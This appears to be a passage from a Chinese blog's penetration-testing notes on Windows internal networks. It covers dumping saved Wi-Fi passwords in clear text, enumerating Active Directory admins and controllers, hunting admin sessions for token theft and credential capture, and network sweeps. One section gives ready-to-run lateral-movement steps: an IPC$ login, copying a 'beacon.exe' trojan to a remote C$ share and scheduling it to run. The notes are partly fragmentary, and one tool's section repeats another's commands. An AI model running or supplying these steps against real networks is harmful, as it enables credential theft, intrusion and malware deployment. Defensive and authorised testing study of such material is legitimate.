<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cmd">查看帮助							 	  netsh wlan <span class="hljs-built_in">help</span><br>列出⽆线接			 					 netsh wlan show interface<br>开启⽆线接			 					 netsh interface <span class="hljs-built_in">set</span> interface &quot;Interface Name&quot; enabled<br>显示连接过的WIFI的配置⽂件	netsh wlan show profiles<br>连接指定wifi							netsh wlan connect name=xxxx<br>断开连接									netsh wlan disconnect<br><br>查看连接过的WIFI的配置⽂件(包含账号密码)，需要管理员权限执⾏，然后使⽤<span class="hljs-built_in">type</span>命令查看配置⽂件<br>netsh wlan export profile interface=WLAN key=clear folder=C:\<br><span class="hljs-built_in">type</span> C:\xxx.xml<br><br>批量显示wifi账号密码<br><span class="hljs-keyword">for</span> /f &quot;skip=<span class="hljs-number">9</span> tokens=<span class="hljs-number">1</span>,<span class="hljs-number">2</span> delims=:&quot; %i <span class="hljs-keyword">in</span> (&#x27;netsh wlan show profiles&#x27;) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">echo</span> %j | <span class="hljs-built_in">findstr</span> -i -v <span class="hljs-built_in">echo</span> | netsh wlan show profiles %j key=clear<br><br>其它常⽤的命令：<br>   导出配置⽂件：netsh wlan export profile key=clear<br>   删除配置⽂件：netsh wlan delete profile name=&quot;&quot;<br>   添加配置⽂件：netsh wlan add profile filename=&quot;&quot;<br></code></pre></td></tr></table></figure>
<h1 id="0x03-域信息收集"><a class="markdownIt-Anchor" href="#0x03-域信息收集"></a> 0x03 域信息收集</h1>
<h2 id="判断是否在域中"><a class="markdownIt-Anchor" href="#判断是否在域中"></a> 判断是否在域中</h2>
<p>本地普通用户：只能查询本机信息</p>
<p>本地管理员用户：可以查域内信息。提升 Ntauthority 或 System 权限后作为域内的机器账户进行认证。</p>
<p>域用户：可以查域内信息。使用 kerberos 协议自动认证。</p>
<ul>
<li>本地普通用户：本机计算机名\john</li>
<li>本地管理员用户：本机计算机名\administrator</li>
<li>域用户：域名\user01</li>
</ul>
<p>几种判断方式</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cmd">---------------利用计算机名和用户名判断--------------------<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">%userdomain%</span> &amp; hostname &amp;&amp; whoami		 # whoami 前的就是域名或主机名<br><span class="hljs-built_in">set</span> l																			 # 本机主机名、域控主机名<br><br>---------------利用DNS服务器一般也部署在DC上判断--------------------<br><span class="hljs-built_in">ipconfig</span> /all							# &lt;主 DNS 后缀&gt;、&lt;DNS 后缀搜索列表&gt; 就是域名<br>nslookup &lt;主 DNS 后缀&gt;		 # 得到域控ip<br><br>---------------利用时间服务器一般也部署在DC上判断--------------------<br><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br><br>		发生系统错误	<span class="hljs-number">5</span>						 			#存在域，但当前用户不是域用户<br>		\\XXX 的当前时间							 	 #存在域，且当前用户是域用户<br>		找不到域 WORKGROUP 的域控制器。	 #当前为工作组环境<br><br>---------------结果不为WORKGROUP则在域中--------------------<br>systeminfo | <span class="hljs-built_in">findstr</span> 域:<br><span class="hljs-built_in">net</span> config workstation | <span class="hljs-built_in">findstr</span> 工作站域<br></code></pre></td></tr></table></figure>
<h2 id="收集域内信息"><a class="markdownIt-Anchor" href="#收集域内信息"></a> 收集域内信息</h2>
<p><strong>查询域名、域策略、域信任关系、域计算机列表、域控、域管、域控</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs cmd">whoami /all				# 获取用户SID，SID去掉后四位就是计算机/域SID<br>sc showsid server	# 获取某服务的SID<br><br>---------------查看有几个域名--------------------<br><span class="hljs-built_in">net</span> view												//无参时：查看当前域或组内的其它计算机名称列表<br><span class="hljs-built_in">net</span> view /domain								//查看有几个域<br><br><span class="hljs-built_in">net</span> view /all \\&lt;ip/hostname&gt;						//带参数：查看远程计算机的文件共享列表，错误<span class="hljs-number">5</span><br><span class="hljs-built_in">dir</span> /Q \\&lt;ip/hostname&gt;\&lt;共享名&gt; 				 //查看某个共享名<br><span class="hljs-built_in">type</span> \\&lt;ip/hostname&gt;\&lt;共享名&gt;\&lt;文件名&gt;	//查看共享文件<br><span class="hljs-built_in">copy</span> .\backdoor.txt \\&lt;ip/hostname&gt;\&lt;共享名&gt;		//上传本地文件到目标共享<br><br>--------------获取域策略信息--------------------<br>nltest /domain_trusts						//获取域信任信息<br><span class="hljs-built_in">net</span> accounts /domain						//获取域密码策略<br><span class="hljs-built_in">net</span> group /domain               //查看所有域组名<br><br>--------------获取域计算机列表--------------------<br><span class="hljs-built_in">net</span> view /domain:GOD									//查看god域中的计算机列表<br><span class="hljs-built_in">net</span> group &quot;domain computers&quot; /domain  //查看所有域成员计算机列表<br><br>--------------定位域控--------------------<br>nltest /DCLIST:&lt;域名&gt;<br>nslookup -<span class="hljs-built_in">type</span>=SRV _ldap._tcp<br><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain																//一般时间服务器为主/备域控<br><span class="hljs-built_in">net</span> group &quot;domain controllers&quot; /domain          //通过域控组查询<br>netdom query pdc          											//查看所有域控的主机名，命令不可用。。<br><br>--------------查域管理员用户--------------------<br><span class="hljs-built_in">net</span> group &quot;domain admins&quot; /domain<br><span class="hljs-built_in">net</span> group &quot;Enterprise Admins&quot; /domain<br><br>--------------查询域用户--------------------<br><span class="hljs-built_in">net</span> localgroup administrators				//查看本地管理员组（因为Domain Admins组默认属于域内机器的本地管理员组）<br><span class="hljs-built_in">net</span> user /domain                    //查看域中所有的用户名，包括域管理<br><span class="hljs-built_in">net</span> user &lt;用户名&gt; /domain		  		 //查看指定用户的详细列表<br>wmic useraccount get /all					  //获取域用户的详细信息<br>dsquery							//域控管理工具<br>dsquery user				//查看域内用户<br>dsquery computer - 查找目录中的计算机<br>dsquery contact - 查找目录中的联系人<br>dsquery subnet - 查找目录中的子网<br>dsquery group - 查找目录中的组<br>dsquery ou - 查找目录中的组织单位<br>dsquery site - 查找目录中的站点<br>dsquery server - 查找目录中的域控制器<br>dsquery user - 查找目录中的用户<br>dsquery quota - 查找目录中的配额<br>dsquery partition - 查找目录中的分区<br>dsquery * - 用通用的 LDAP 查询查找目录中的任何对象<br></code></pre></td></tr></table></figure>
<h2 id="域提权"><a class="markdownIt-Anchor" href="#域提权"></a> 域提权</h2>
<p>通过日志定位：指本地机器的管理员日志，可以使用脚本或 Wevtutil 工具导出查看</p>
<p>通过会话/进程定位：指域内每台机器的登录会话，可以使用 netsess.exe、PowerView 等工具匿名查询。</p>
<h2 id="域提权-定位域管理员"><a class="markdownIt-Anchor" href="#域提权-定位域管理员"></a> 域提权 - 定位域管理员</h2>
<p><strong>漏洞拿机器，然后抓域管明文或 hash？</strong></p>
<p>PS: 当拿下边界服务器进行横向移动时，需要先知道当前域用户的登录位置、是否是其它系统的本地管理员、所属组、是否有权访问文件共享。</p>
<p>服务器加域后，系统会自动将 domain admins 组加到域成员服务器的 administrators 组，因此域管理员组的成员均可访问本地计算机，并具有管理员权限。</p>
<blockquote>
<p>常用工具：psloggedon.exe、PVEFindADUser.exe、netsess.exe、hunter、NetView、PowerShell - PowerView</p>
</blockquote>
<h3 id="bloodyadpy"><a class="markdownIt-Anchor" href="#bloodyadpy"></a> <a target="_blank" rel="external nofollow noopener noreferrer" href="http://bloodyAD.py">bloodyAD.py</a></h3>
<p>查询域内信息的一款工具，主要用来修改账户属性、 新增机器账户，其它查询功能较为常规。</p>
<h3 id="psloggedonexe"><a class="markdownIt-Anchor" href="#psloggedonexe"></a> psloggedon.exe</h3>
<p>net session 可以查看谁使用了本机资源，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户。原理是：调用 NetSessionEnum API 检查注册表 HKEY_USERS 项的 key 值来查询谁登陆过。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">psloggedon.exe -										#<br>psloggedon.exe -l 									#仅显示本地登录<br>psloggedon.exe -x										#不显示登录时间<br>psloggedon.exe \\&lt;计算机名&gt;					 #列出指定计算机的登录信息<br>psloggedon.exe &lt;用户名&gt;							#指定用户名，在网络种搜索该用户登录的计算机。<br></code></pre></td></tr></table></figure>
<h3 id="pvefindaduserexe"><a class="markdownIt-Anchor" href="#pvefindaduserexe"></a> PVEFindADUser.exe</h3>
<p>PVEFindADUser 用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务器和计划任务的用户，该工具需要管理员权限。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cmd">netview.exe -h               										#帮助<br>netview.exe -f filename.txt  										#指定要提取主机列表的文件<br>netview.exe -e filename.txt  										#指定要排除的主机名的文件<br>netview.exe -o filename.txt  										#将所有输出重定向到指定的文件<br>netview.exe -d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表<br>netview.exe -g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索<br>netview.exe -c               对已找到的共享目录/文件的访问权限进行检查<br>netview.exe -i interval      枚举主机之间等待的秒数<br>netview.exe -j jitter        应用于间隔的抖动百分比（<span class="hljs-number">0</span>.<span class="hljs-number">0</span>-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>）<br></code></pre></td></tr></table></figure>
<h3 id="netviewexe"><a class="markdownIt-Anchor" href="#netviewexe"></a> netview.exe</h3>
<p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cmd">netview.exe -h               										#帮助<br>netview.exe -f filename.txt  										#指定要提取主机列表的文件<br>netview.exe -e filename.txt  										#指定要排除的主机名的文件<br>netview.exe -o filename.txt  										#将所有输出重定向到指定的文件<br>netview.exe -d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表<br>netview.exe -g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索<br>netview.exe -c               对已找到的共享目录/文件的访问权限进行检查<br>netview.exe -i interval      枚举主机之间等待的秒数<br>netview.exe -j jitter        应用于间隔的抖动百分比（<span class="hljs-number">0</span>.<span class="hljs-number">0</span>-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>）<br></code></pre></td></tr></table></figure>
<h3 id="nmap-nse-脚本"><a class="markdownIt-Anchor" href="#nmap-nse-脚本"></a> Nmap - NSE 脚本</h3>
<p>smb-enum-domains.nse 枚举域控，获取主机信息、用户、可使用密码策略的用户等</p>
<p>smb-enum-users.nse 扫描域控，获取更多的域用户信息</p>
<p>smb-enum-shares.nse 遍历远程主机的共享目录</p>
<p>smb-enum-processes.nse 对主机的系统进程进行遍历，目标主机运行着哪些软件</p>
<p>smb-enum-sessions.nse 获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p>
<p>smb-os-discovery.nse 收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS 机器名、NetBIOS 域名、工作组、系统时间等信息</p>
<h3 id="powerview-脚本"><a class="markdownIt-Anchor" href="#powerview-脚本"></a> PowerView 脚本</h3>
<h2 id="域提权-定位域管进程"><a class="markdownIt-Anchor" href="#域提权-定位域管进程"></a> 域提权 - 定位域管进程</h2>
<p><strong>令牌窃取，以达到域权限提升的目的？</strong></p>
<p><strong>方法 1：会话/进程检查域管</strong></p>
<p>定位域管会话，拿下机器，抓域管密码。</p>
<p>定位域管进程，拿下机器，令牌窃取。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># 单机查找<br>quser					# 查看当前机器会话，关注是否有域管账户，导lsass.exe快照，抓明文<br>tasklist /v		# 查看进程，关注进程启动用户，可能有域管，令牌窃取<br>- tasklist /v /fi &quot;USERNAME eq 域名\域管名&quot;<br><br># 批量检查域管进程<br>## 先导一份域管名单<br><span class="hljs-built_in">net</span> group &quot;Domain Admins&quot; /domain						# 查域管<br><br>## 收集的待检查机器ip<br>ips.txt<br><br>## p73 <span class="hljs-keyword">for</span> 循环批量导远程机器进程，然后用域管名单筛选。<br>tasklist /v /s &lt;ip&gt; /u &lt;user&gt; /p &lt;passwd&gt; 	# 核心命令，查看远程机器进程，？？？此处存疑，当前账户可以登其它机器，不就是域管？<br></code></pre></td></tr></table></figure>
<p><strong>方法 2：批量搜索域控上的域用户会话</strong></p>
<p>定位域管会话，拿下机器，抓域管密码。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># <span class="hljs-number">1</span>、获取筛选信息<br><span class="hljs-built_in">net</span> group &quot;Domain Controllers&quot; /domain			# 查域控机器名<br><span class="hljs-built_in">net</span> group &quot;Domain Admins&quot; /domain						# 查域管<br><br># <span class="hljs-number">2</span>、netsess.exe	收集所有活动域的会话列表，<br>返回活动会话的ip、域账户、会话时间、会话空闲时间<br><br># <span class="hljs-number">3</span>、筛选得到域控上的域用户会话<br>p72 <span class="hljs-built_in">cmd</span> <span class="hljs-keyword">for</span> 命令<br></code></pre></td></tr></table></figure>
<p>Get Domain Admins（GDA）批处理脚本一把锁</p>
<p><strong>方法 3：批量搜索远程机器 NetBIOS</strong></p>
<p>定位域管会话，某些版本 windows 允许用户通过 NetBIOS 查询已登录用户。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">nbtstat -A &lt;IP&gt;<br># p73 <span class="hljs-keyword">for</span>循环<br></code></pre></td></tr></table></figure>
<h1 id="0x04-内网横向思路及如何跨网段"><a class="markdownIt-Anchor" href="#0x04-内网横向思路及如何跨网段"></a> 0x04 内网横向思路及如何跨网段</h1>
<p>1、我是谁、我在哪、我的目标</p>
<p>2、信息收集</p>
<p>3、横向移动</p>
<h2 id="探测域内存活主机"><a class="markdownIt-Anchor" href="#探测域内存活主机"></a> 探测域内存活主机</h2>
<ul>
<li>NetBIOS 探测：</li>
<li>ICMP 探测：for in</li>
<li>ARP 扫描：arp.exe、Empire - arpscan、Nishang - Invoke-ARPScan.ps1</li>
<li>TCP/UDP 端口扫描：nmap、masscan、telnet、MSF - portscan 模块、Nishang - Invoke-PortScan.ps1、PowerSploit - Invoke-portscan.ps1</li>
</ul>
<p><strong>ICMP 探测</strong></p>
<ul>
<li>for in</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> /l  %i  in (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">255</span>) do @  ping  <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">1</span>.%i  -w  <span class="hljs-number">1</span>  -n  <span class="hljs-number">1</span> |  find  /i  <span class="hljs-string">&quot;ttl=&quot;</span><br></code></pre></td></tr></table></figure>
<ul>
<li>vbs 脚本</li>
</ul>
<p>cscript 1.vbs</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">p51<br></code></pre></td></tr></table></figure>
<p><strong>ARP 扫描</strong></p>
<p>动静是否会太大。</p>
<p><strong>TCP/UDP 端口扫描</strong></p>
<h2 id="找网段"><a class="markdownIt-Anchor" href="#找网段"></a> 找网段</h2>
<p>#DNS</p>
<p><strong>DNS 区域传输漏洞</strong></p>
<blockquote>
<p>**DNS 区域传送（DNS zone transfer）**是指一台备用 DNS 服务器使用来自主 DNS 服务器的数据刷新自己的域（zone）数据库，从而避免主 DNS 服务器因意外故障影响到整个域名解析服务。</p>
<p><strong>DNS 区域传送方式</strong>：axfr：完全区域传送、ixfr：增量区域传送</p>
<p><strong>DNS 区域传输漏洞</strong>：一般来说 DNS 区域传送只在主备 DNS 服务器间使用，但由于主服务器错误配置，导致任意用户发起请求后可获得一个 zone 数据库的详细信息。</p>
<p><strong>修复方式</strong>：添加 allow-transfer，配置 ip 白名单</p>
</blockquote>
<p>利用<br>
#nslookup #nmap</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">nslookup<br>ls &lt;完整域名&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">nmap --script dns-zone-transfer.nse --script-args &quot;dns-zone-transfer.domain=域名&quot; -Pn -p <span class="hljs-number">53</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">101</span>.<span class="hljs-number">152</span><br></code></pre></td></tr></table></figure>
<h2 id="远程连接"><a class="markdownIt-Anchor" href="#远程连接"></a> 远程连接</h2>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cmd">建立IPC连接命令：<br><span class="hljs-built_in">net</span> use \\<span class="hljs-number">191</span>.<span class="hljs-number">168</span>.<span class="hljs-number">52</span>.<span class="hljs-number">136</span>\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;<br><br>断开连接：<br><span class="hljs-built_in">net</span> use \\x.x.x.x\ipc$ /<span class="hljs-built_in">del</span><br><br>查看连接是否建立：<br><span class="hljs-built_in">net</span> use<br><br>测试连接：<br><span class="hljs-built_in">dir</span> \\<span class="hljs-number">191</span>.<span class="hljs-number">168</span>.<span class="hljs-number">52</span>.<span class="hljs-number">136</span>\c$<br><br>拷贝木马：<br><span class="hljs-built_in">copy</span> beacon.exe \\<span class="hljs-number">191</span>.<span class="hljs-number">168</span>.<span class="hljs-number">52</span>.<span class="hljs-number">136</span>\c$<br><br>创建计划任务(<span class="hljs-built_in">at</span>&lt;<span class="hljs-number">2012</span>、schtasks&gt;=<span class="hljs-number">2012</span>)：<br><span class="hljs-built_in">at</span> \\<span class="hljs-number">191</span>.<span class="hljs-number">168</span>.<span class="hljs-number">52</span>.<span class="hljs-number">136</span> <span class="hljs-number">15</span>:<span class="hljs-number">47</span> c:\beacon.exe<br></code></pre></td></tr></table></figure>
<h2 id="主机名"><a class="markdownIt-Anchor" href="#主机名"></a> 主机名</h2>
<h2 id="端口-重点关注的组件"><a class="markdownIt-Anchor" href="#端口-重点关注的组件"></a> 端口 - 重点关注的组件</h2>
<p><strong>数据库凭据</strong>：抓 navicat 凭据、弱口令</p>
<ul>
<li>
<p>1433 sqlserver sa 用户利用 xp<em>cmdshell、sp_configure、sp</em>*提权</p>
</li>
<li>
<p>#数据库/SQLServer</p>
</li>
<li>
<p>3306 mysql root 用户利用 udf 提权 #数据库/MySQL</p>
<ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/litlife/p/9030673.html">udf 提权原理详解 - ka1n4t - 博客园</a></li>
</ul>
</li>
<li>
<p>1521 oracle #oracle</p>
</li>
<li>
<p>6379 redis 未授权漏洞利用 #Redis</p>
</li>
<li>
<p>9200 ES 未授权</p>
</li>
<li>
<p>27017 MongoDB 未授权 #MongoDB</p>
</li>
</ul>
<h2 id="web-应用-重点"><a class="markdownIt-Anchor" href="#web-应用-重点"></a> web 应用 - 重点</h2>
<p>OA：通达、泛微、帆软</p>
<p>邮箱：coremail</p>
<p>shiro、solr、weblogic</p>
<h2 id="集权系统"><a class="markdownIt-Anchor" href="#集权系统"></a> 集权系统</h2>
<p>VCenter</p>
<p>ESXI</p>
<p>天擎服务端</p>
<p>深信服 EDR</p>
<p>堡垒机</p>
<h2 id="主机漏洞"><a class="markdownIt-Anchor" href="#主机漏洞"></a> 主机漏洞</h2>
<p>135 Wmihacker、ShareWmi</p>
<p>445 CS - psexec、MSF - exploit/windows/smb/、IPC 连接、Impacket 工具包（psexec、smbexec、wmiexec）</p>
<p>3389 RDP CVE-2019-0708</p>
<p>5985 WinRM</p>
<p>CS 4.1</p>
<p>毒液 Venom</p>

                
              </div>
            
            <hr>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/A-OS/" class="category-chain-item">A_OS</a>
  
  
    <span>></span>
    
  <a href="/categories/A-OS/Windows/" class="category-chain-item">Windows</a>
  
  
    <span>></span>
    
  <a href="/categories/A-OS/Windows/%E5%B7%A5%E5%85%B7/" class="category-chain-item">工具</a>
  
  

  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/windows/" class="print-no-link">#windows</a>
      
        <a href="/tags/%E4%BF%A1%E6%81%AF/" class="print-no-link">#信息</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>【windows】内网信息收集</div>
      <div>https://hodlyounger.github.io/A_OS/Windows/工具/【windows】内网信息收集/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>mingming</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年10月27日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/" rel="external nofollow noopener noreferrer">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/A_OS/Windows/%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E9%9B%86/" title="windows 工具集">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">windows 工具集</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/A_OS/Windows/%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/%E3%80%90winapi%E3%80%91%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E4%B9%8B%E4%BF%A1%E5%8F%B7%E9%87%8FSeamphorse/" title="【winapi】线程同步之信号量（Semaphores）">
                        <span class="hidden-mobile">【winapi】线程同步之信号量（Semaphores）</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script>
  <link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css">

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js"></script>
<script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script>
<script src="/js/events.js"></script>
<script src="/js/plugins.js"></script>


  <script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script src="/js/img-lazyload.js"></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script>

